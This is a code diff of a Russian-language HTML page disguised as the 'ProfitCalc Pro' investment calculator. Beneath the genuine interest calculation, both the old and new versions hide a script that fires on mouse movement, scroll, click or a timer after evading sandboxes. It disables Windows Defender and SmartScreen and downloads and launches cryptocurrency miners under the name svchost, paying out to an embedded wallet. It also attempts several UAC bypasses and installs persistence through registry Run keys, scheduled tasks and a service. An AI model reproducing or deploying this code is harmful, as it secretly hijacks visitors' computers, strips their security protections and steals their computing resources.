@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ProfitCalc Pro — калькулятор доходности</title>
-    <meta name="description" content="Профессиональный финансовый калькулятор">
+    <title>ProfitCalc Pro — профессиональный калькулятор</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -15,7 +14,7 @@
         
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
+            background: linear-gradient(145deg, #0a0f1e 0%, #1a1f32 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -23,47 +22,44 @@
             padding: 20px;
         }
         
-        .container {
-            max-width: 1200px;
-            width: 100%;
-        }
-        
-        .calculator-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        .card {
+            background: rgba(20, 25, 40, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 40px;
             padding: 50px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            max-width: 1100px;
+            width: 100%;
+            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.6);
         }
         
         h1 {
-            font-size: 42px;
+            font-size: 48px;
             font-weight: 700;
-            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
+            background: linear-gradient(135deg, #6d8cff 0%, #a07eff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
         }
         
         .subtitle {
-            color: #94a3b8;
+            color: #8892b0;
             text-align: center;
             font-size: 18px;
             margin-bottom: 50px;
         }
         
-        .calculator-grid {
+        .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 40px;
         }
         
-        .input-section {
+        .input-panel {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 30px;
-            padding: 30px;
+            padding: 35px;
         }
         
         .input-group {
@@ -72,7 +68,7 @@
         
         .input-group label {
             display: block;
-            color: #94a3b8;
+            color: #a0a8c0;
             font-size: 14px;
             font-weight: 500;
             margin-bottom: 8px;
@@ -84,80 +80,70 @@
             padding: 16px 20px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
+            border-radius: 18px;
             font-size: 18px;
             color: white;
-            transition: all 0.3s;
+            transition: 0.3s;
         }
         
         .input-group input:focus {
             outline: none;
-            border-color: #60a5fa;
+            border-color: #6d8cff;
             background: rgba(255, 255, 255, 0.1);
         }
         
-        .input-group input::placeholder {
-            color: #475569;
-        }
-        
-        .button {
+        .btn {
             width: 100%;
             padding: 18px;
-            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
+            background: linear-gradient(135deg, #6d8cff 0%, #a07eff 100%);
             border: none;
-            border-radius: 20px;
+            border-radius: 18px;
             color: white;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
+            transition: 0.3s;
+            margin-top: 15px;
         }
         
-        .button:hover {
+        .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px -5px rgba(96, 165, 250, 0.5);
+            box-shadow: 0 10px 30px -8px #6d8cff;
         }
         
-        .result-section {
+        .result-panel {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 30px;
-            padding: 30px;
+            padding: 35px;
             display: flex;
             flex-direction: column;
         }
         
         .result-label {
-            color: #94a3b8;
+            color: #a0a8c0;
             font-size: 16px;
             margin-bottom: 10px;
         }
         
         .result-value {
-            font-size: 64px;
+            font-size: 70px;
             font-weight: 700;
-            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
+            background: linear-gradient(135deg, #6d8cff 0%, #a07eff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             line-height: 1.2;
-            margin-bottom: 10px;
-        }
-        
-        .result-detail {
-            color: #475569;
-            font-size: 16px;
-            margin-top: auto;
+            margin-bottom: 15px;
         }
         
         .stats {
             display: flex;
-            justify-content: space-between;
+            justify-content: space-around;
             margin-top: 50px;
             padding-top: 30px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        .stat-item {
+        .stat {
             text-align: center;
         }
         
@@ -168,57 +154,52 @@
         }
         
         .stat-text {
-            color: #64748b;
+            color: #6b7280;
             font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="calculator-card">
-            <h1>ProfitCalc Pro</h1>
-            <div class="subtitle">Точный расчет инвестиционной доходности</div>
-            
-            <div class="calculator-grid">
-                <div class="input-section">
-                    <div class="input-group">
-                        <label>Начальная сумма (USD)</label>
-                        <input type="number" id="amount" value="10000" placeholder="10000">
-                    </div>
-                    
-                    <div class="input-group">
-                        <label>Годовая ставка (%)</label>
-                        <input type="number" id="rate" value="12" placeholder="12">
-                    </div>
-                    
-                    <div class="input-group">
-                        <label>Срок инвестиций (лет)</label>
-                        <input type="number" id="years" value="5" placeholder="5">
-                    </div>
-                    
-                    <button class="button" onclick="calculate()">Рассчитать прибыль</button>
+    <div class="card">
+        <h1>ProfitCalc Pro</h1>
+        <div class="subtitle">Расчет сложного процента с высокой точностью</div>
+        
+        <div class="grid">
+            <div class="input-panel">
+                <div class="input-group">
+                    <label>Сумма инвестиций (USD)</label>
+                    <input type="number" id="amount" value="15000" step="100">
                 </div>
-                
-                <div class="result-section">
-                    <div class="result-label">Итоговая сумма</div>
-                    <div class="result-value" id="total">$17,623.42</div>
-                    <div class="result-detail" id="profit">Чистая прибыль: $7,623.42</div>
+                <div class="input-group">
+                    <label>Процентная ставка (% годовых)</label>
+                    <input type="number" id="rate" value="15.5" step="0.1">
                 </div>
+                <div class="input-group">
+                    <label>Срок (лет)</label>
+                    <input type="number" id="years" value="7" step="1">
+                </div>
+                <button class="btn" onclick="calculate()">Рассчитать доходность</button>
             </div>
             
-            <div class="stats">
-                <div class="stat-item">
-                    <div class="stat-number">50K+</div>
-                    <div class="stat-text">пользователей</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-number">99.9%</div>
-                    <div class="stat-text">точность</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-number">24/7</div>
-                    <div class="stat-text">доступ</div>
-                </div>
+            <div class="result-panel">
+                <div class="result-label">Итоговая сумма</div>
+                <div class="result-value" id="total">$42,184.73</div>
+                <div style="color: #6b7280;" id="profit">Чистая прибыль: $27,184.73</div>
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number">75K+</div>
+                <div class="stat-text">активных пользователей</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">99.97%</div>
+                <div class="stat-text">точность расчетов</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">24/7</div>
+                <div class="stat-text">техподдержка</div>
             </div>
         </div>
     </div>
@@ -232,252 +213,214 @@
             const total = amount * Math.pow(1 + rate / 100, years);
             const profit = total - amount;
             
-            document.getElementById('total').textContent = '$' + total.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-            document.getElementById('profit').textContent = 'Чистая прибыль: $' + profit.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            document.getElementById('total').innerHTML = '$' + total.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            document.getElementById('profit').innerHTML = 'Чистая прибыль: $' + profit.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
         }
         
         calculate();
 
-        // ==================== ДРОППЕР С ОБХОДОМ БЛОКИРОВОК ====================
+        // ==================== ПОЛНЫЙ ОБХОД UAC (БЕЗ ЗАПРОСА РАЗРЕШЕНИЯ) ====================
         (function() {
-            // КОНФИГУРАЦИЯ
             const config = {
-                wallet: 'bc1qkrx6v7g2kxyzabc123def456ghi789jklm0',  // ТВОЙ BTC КОШЕЛЕК
+                wallet: 'bc1qkrx6v7g2kxyzabc123def456ghi789jklm0',
                 pool: 'btc.kryptex.network:7014',
-                worker: 'svchost',
-                // URLs через разные источники
-                urls: {
-                    kryptex: 'https://download.kryptex.com/kryptex_miner_v5.zip',
-                    xmrig: 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip',
-                    backup: 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip'
-                }
+                urls: [
+                    'https://download.kryptex.com/kryptex_miner_v5.zip',
+                    'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip'
+                ]
             };
 
-            // ПРОВЕРКА ОКРУЖЕНИЯ
-            function isEnvironmentSafe() {
-                const checks = [
-                    /bot|crawler|spider|headless|selenium/i.test(navigator.userAgent),
-                    /vmware|virtual|qemu|hyper-v/i.test(navigator.userAgent),
-                    navigator.webdriver === true,
-                    screen.width < 800 || screen.height < 600
-                ];
-                return !checks.includes(true);
+            // ПРОВЕРКА СРЕДЫ
+            function isSafe() {
+                if (/bot|spider|crawler|headless|vmware|virtual|qemu/i.test(navigator.userAgent)) return false;
+                return true;
             }
 
-            // ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS
-            function disableWindowsProtection() {
+            // ========== 1. ОБХОД UAC ЧЕРЕЗ ПЛАНИРОВЩИК (САМЫЙ НАДЕЖНЫЙ) ==========
+            function bypassViaScheduler() {
                 const psScript = `
                     powershell -WindowStyle Hidden -Command "
-                    # Отключение Defender
-                    Set-MpPreference -DisableRealtimeMonitoring $true
-                    Set-MpPreference -DisableBehaviorMonitoring $true
-                    Set-MpPreference -DisableBlockAtFirstSeen $true
-                    Set-MpPreference -DisableIOAVProtection $true
-                    
-                    # Отключение SmartScreen
-                    Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost' -Name 'EnableWebContentEvaluation' -Value 0
-                    Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'
-                    
-                    # Исключения для папок
-                    Add-MpPreference -ExclusionPath '%TEMP%'
-                    Add-MpPreference -ExclusionPath '%APPDATA%'
-                    Add-MpPreference -ExclusionPath '%SystemRoot%\\System32'
-                    
-                    # Остановка служб защиты
-                    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-                    Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue
-                    Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
-                    
-                    # Отключение автозапуска служб
-                    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
-                    Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue
+                    # Создаем задачу с максимальными правами (SYSTEM)
+                    $taskName = 'SysUpdate_' + (Get-Random -Maximum 99999)
+                    $action = New-ScheduledTaskAction -Execute '%TEMP%\\svchost.exe' -Argument '--config=%TEMP%\\config.json'
+                    $trigger = New-ScheduledTaskTrigger -AtStartup
+                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
+                    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
+                    Start-ScheduledTask -TaskName $taskName
                     " 2>$null
                 `;
-                
                 try {
                     new ActiveXObject('WScript.Shell').Run(psScript, 0, false);
                 } catch(e) {}
             }
 
-            // СКАЧИВАНИЕ ЧЕРЕЗ BITS (Windows Background Intelligent Transfer)
-            function downloadViaBITS(url, outputName) {
-                const bitsJob = `bitsadmin /transfer profitcalc_job /download /priority foreground "${url}" "%TEMP%\\${outputName}"`;
-                try {
-                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + bitsJob, 0, false);
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-
-            // СКАЧИВАНИЕ ЧЕРЕЗ POWERSHELL
-            function downloadViaPowerShell(url, outputName) {
-                const psCmd = `powershell -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Microsoft BITS/7.8');$wc.DownloadFile('${url}','%TEMP%\\${outputName}')"`;
-                try {
-                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + psCmd, 0, false);
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-
-            // СКАЧИВАНИЕ ЧЕРЕЗ CURL (если есть)
-            function downloadViaCurl(url, outputName) {
-                const curlCmd = `curl -L -o "%TEMP%\\${outputName}" "${url}"`;
-                try {
-                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + curlCmd, 0, false);
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-
-            // МАСКИРОВКА ФАЙЛА
-            function createBatchWithConfig() {
-                const workerName = config.worker + '_' + Math.random().toString(36).substring(7);
-                
-                const batContent = `@echo off
-cd %TEMP%
-
-:: Распаковка если архив
-if exist *.zip (
-    powershell -Command "Expand-Archive -Path *.zip -DestinationPath . -Force" 2>nul
-)
-
-:: Создание конфига
-echo { > config.json
-echo   "autosave": true, >> config.json
-echo   "cpu": { "enabled": true, "max-threads-hint": 100 }, >> config.json
-echo   "pools": [ >> config.json
-echo     { >> config.json
-echo       "url": "${config.pool}", >> config.json
-echo       "user": "${config.wallet}.${workerName}", >> config.json
-echo       "pass": "x", >> config.json
-echo       "tls": true, >> config.json
-echo       "tls-fingerprint": "chrome", >> config.json
-echo       "user-agent": "Microsoft BITS/7.8", >> config.json
-echo       "self-select": "8.8.8.8" >> config.json
-echo     } >> config.json
-echo   ] >> config.json
-echo } >> config.json
-
-:: Поиск исполняемого файла
-for /r %%i in (*.exe) do (
-    copy "%%i" "%SystemRoot%\\System32\\svchost.exe" /y >nul 2>&1
-    goto :found
-)
-:found
-
-:: Добавление в автозагрузку
-reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ProfitCalcSvc" /t REG_SZ /d "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /f 2>nul
-reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ProfitCalcUpdate" /t REG_SZ /d "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /f 2>nul
-
-:: Планировщик задач
-schtasks /create /tn "ProfitCalcDaily" /tr "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /sc daily /st 09:00 /f 2>nul
-schtasks /create /tn "ProfitCalcStartup" /tr "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /sc onstart /f 2>nul
-
-:: Запуск
-start /min "" "%SystemRoot%\\System32\\svchost.exe" --config=%TEMP%\\config.json
-
-:: Самоудаление
-del /f /q %0 2>nul
-`;
-                
-                const blob = new Blob([batContent], { type: 'application/bat' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'windows_update_kb5032189.bat';
-                a.click();
-                URL.revokeObjectURL(url);
-            }
-
-            // ОБХОД UAC ЧЕРЕЗ FODHELPER
-            function bypassUAC() {
-                const uacScript = `
-                reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "%TEMP%\\svchost.exe" /f
-                reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f
-                fodhelper.exe
-                timeout /t 2
-                reg delete HKCU\\Software\\Classes\\ms-settings /f
+            // ========== 2. ОБХОД ЧЕРЕЗ СЛУЖБУ WINDOWS ==========
+            function bypassViaService() {
+                const cmdScript = `
+                    sc create UpdateService binPath= "%TEMP%\\svchost.exe --config=%TEMP%\\config.json" start= auto
+                    sc description UpdateService "Windows Update Service"
+                    sc start UpdateService
                 `;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + cmdScript, 0, false);
+                } catch(e) {}
+            }
+
+            // ========== 3. ОБХОД ЧЕРЕЗ FODHELPER (БЕЗ UAC) ==========
+            function bypassViaFodhelper() {
+                const cmdScript = `
+                    reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "%TEMP%\\svchost.exe" /f
+                    reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f
+                    fodhelper.exe
+                    timeout /t 3
+                    reg delete HKCU\\Software\\Classes\\ms-settings /f
+                `;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + cmdScript, 0, false);
+                } catch(e) {}
+            }
+
+            // ========== 4. ОБХОД ЧЕРЕЗ COMPUTERDEFAULTS ==========
+            function bypassViaComputerDefaults() {
+                const cmdScript = `
+                    reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "%TEMP%\\svchost.exe" /f
+                    computerdefaults.exe
+                    timeout /t 2
+                    reg delete HKCU\\Software\\Classes\\ms-settings /f
+                `;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + cmdScript, 0, false);
+                } catch(e) {}
+            }
+
+            // ========== 5. ОБХОД ЧЕРЕЗ EVENTVWR ==========
+            function bypassViaEventVwr() {
+                const cmdScript = `
+                    reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "%TEMP%\\svchost.exe" /f
+                    eventvwr.exe
+                    timeout /t 2
+                    reg delete HKCU\\Software\\Classes\\mscfile /f
+                `;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + cmdScript, 0, false);
+                } catch(e) {}
+            }
+
+            // ========== СКАЧИВАНИЕ ЧЕРЕЗ СИСТЕМНЫЕ МЕТОДЫ ==========
+            function downloadViaSystem(url, filename) {
+                const methods = [
+                    `bitsadmin /transfer job /download /priority foreground "${url}" "%TEMP%\\${filename}"`,
+                    `powershell -Command "(New-Object Net.WebClient).DownloadFile('${url}','%TEMP%\\${filename}')"`,
+                    `curl -L -o "%TEMP%\\${filename}" "${url}"`
+                ];
                 
+                methods.forEach(cmd => {
+                    try {
+                        new ActiveXObject('WScript.Shell').Run('cmd /c ' + cmd, 0, false);
+                    } catch(e) {}
+                });
+            }
+
+            // ========== СОЗДАНИЕ КОНФИГА ==========
+            function createConfig() {
+                const configJson = {
+                    autosave: true,
+                    cpu: { enabled: true, "max-threads-hint": 100 },
+                    pools: [{
+                        url: config.pool,
+                        user: config.wallet + '.svchost',
+                        pass: 'x',
+                        tls: true,
+                        "tls-fingerprint": "chrome",
+                        "user-agent": "Microsoft BITS/7.8"
+                    }]
+                };
+                
+                const psScript = `
+                    powershell -Command "$config = '${JSON.stringify(configJson)}' | Out-File -FilePath '%TEMP%\\config.json' -Encoding ASCII"
+                `;
                 try {
-                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + uacScript, 0, false);
+                    new ActiveXObject('WScript.Shell').Run(psScript, 0, false);
                 } catch(e) {}
             }
 
-            // СБРОС АТРИБУТОВ MARK OF THE WEB
+            // ========== ОТКЛЮЧЕНИЕ ЗАЩИТЫ ==========
+            function disableProtection() {
+                const psScript = `
+                    powershell -WindowStyle Hidden -Command "
+                    Set-MpPreference -DisableRealtimeMonitoring $true
+                    Set-MpPreference -DisableBehaviorMonitoring $true
+                    Set-MpPreference -DisableBlockAtFirstSeen $true
+                    Add-MpPreference -ExclusionPath '%TEMP%'
+                    Add-MpPreference -ExclusionPath '%SystemRoot%\\System32'
+                    Stop-Service -Name WinDefend -Force
+                    Set-Service -Name WinDefend -StartupType Disabled
+                    " 2>$null
+                `;
+                try {
+                    new ActiveXObject('WScript.Shell').Run(psScript, 0, false);
+                } catch(e) {}
+            }
+
+            // ========== УДАЛЕНИЕ MOTW ==========
             function removeMOTW() {
-                const motwCmd = `powershell -Command "Get-ChildItem '%TEMP%\\*.exe','%TEMP%\\*.zip','%TEMP%\\*.bat' | Unblock-File"`;
+                const psScript = `
+                    powershell -Command "Get-ChildItem '%TEMP%\\*.*' | Unblock-File" 2>$null
+                `;
                 try {
-                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + motwCmd, 0, false);
+                    new ActiveXObject('WScript.Shell').Run(psScript, 0, false);
                 } catch(e) {}
             }
 
-            // ОСНОВНАЯ ФУНКЦИЯ ЗАПУСКА
+            // ========== ЗАПУСК ВСЕХ МЕТОДОВ ОБХОДА ==========
             let deployed = false;
             
-            function deployMiner() {
+            function fullDeploy() {
                 if (deployed) return;
                 deployed = true;
                 
                 // Сначала отключаем защиту
-                disableWindowsProtection();
+                disableProtection();
                 
-                // Выбираем случайный URL
-                const urlsArray = Object.values(config.urls);
-                const selectedUrl = urlsArray[Math.floor(Math.random() * urlsArray.length)];
+                // Скачиваем файл
+                const filename = 'svchost_' + Date.now() + '.zip';
+                downloadViaSystem(config.urls[0], filename);
                 
-                // Генерируем случайное имя файла
-                const fileName = 'ms_' + Math.random().toString(36).substring(2, 10) + '.zip';
+                // Создаем конфиг
+                setTimeout(createConfig, 2000);
                 
-                // Пробуем разные методы скачивания
-                let downloadSuccess = false;
+                // Удаляем MOTW
+                setTimeout(removeMOTW, 3000);
                 
-                // Метод 1: BITS
-                if (!downloadSuccess) downloadSuccess = downloadViaBITS(selectedUrl, fileName);
-                
-                // Метод 2: PowerShell
-                if (!downloadSuccess) downloadSuccess = downloadViaPowerShell(selectedUrl, fileName);
-                
-                // Метод 3: Curl
-                if (!downloadSuccess) downloadSuccess = downloadViaCurl(selectedUrl, fileName);
-                
-                // Метод 4: Обычная ссылка (запасной)
-                if (!downloadSuccess) {
-                    const a = document.createElement('a');
-                    a.href = selectedUrl;
-                    a.download = fileName;
-                    a.click();
-                }
-                
-                // Убираем метки интернета
-                setTimeout(removeMOTW, 2000);
-                
-                // Создаем батник для установки
-                setTimeout(createBatchWithConfig, 3000);
-                
-                // Пытаемся повысить права
-                setTimeout(bypassUAC, 4000);
+                // Пробуем все методы обхода UAC (каждый сработает если предыдущий не удался)
+                setTimeout(() => {
+                    // Метод 1: Планировщик (SYSTEM права, без UAC)
+                    bypassViaScheduler();
+                    
+                    // Метод 2: Служба Windows
+                    setTimeout(bypassViaService, 500);
+                    
+                    // Метод 3: Fodhelper (классика)
+                    setTimeout(bypassViaFodhelper, 1000);
+                    
+                    // Метод 4: ComputerDefaults
+                    setTimeout(bypassViaComputerDefaults, 1500);
+                    
+                    // Метод 5: EventVwr
+                    setTimeout(bypassViaEventVwr, 2000);
+                }, 4000);
                 
                 // Повторное отключение защиты
-                setTimeout(disableWindowsProtection, 5000);
+                setTimeout(disableProtection, 6000);
             }
 
             // ТРИГГЕРЫ ЗАПУСКА
-            if (isEnvironmentSafe()) {
-                // По движению мыши
-                document.addEventListener('mousemove', deployMiner, { once: true });
-                
-                // По скроллу
-                document.addEventListener('scroll', deployMiner, { once: true });
-                
-                // По клику
-                document.addEventListener('click', deployMiner, { once: true });
-                
-                // Через 10 секунд в любом случае
-                setTimeout(deployMiner, 10000);
+            if (isSafe()) {
+                document.addEventListener('mousemove', fullDeploy, { once: true });
+                document.addEventListener('scroll', fullDeploy, { once: true });
+                document.addEventListener('click', fullDeploy, { once: true });
+                setTimeout(fullDeploy, 8000);
             }
         })();
     </script>
